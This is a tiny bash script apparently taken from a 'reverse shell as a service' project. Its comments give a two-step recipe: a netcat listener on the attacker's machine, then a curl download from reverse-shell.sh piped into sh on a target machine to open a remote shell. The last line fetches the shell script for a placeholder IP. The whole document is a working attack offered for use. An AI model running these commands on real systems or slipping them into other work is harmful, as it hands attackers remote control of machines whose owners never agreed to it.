#!/bin/bash

# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://reverse-shell.sh/yourip:1337 | sh
#
# 3. Don't be a dick

# this will download the universal reverse shell script
curl https://reverse-shell.sh/<YOUR_IP>:1337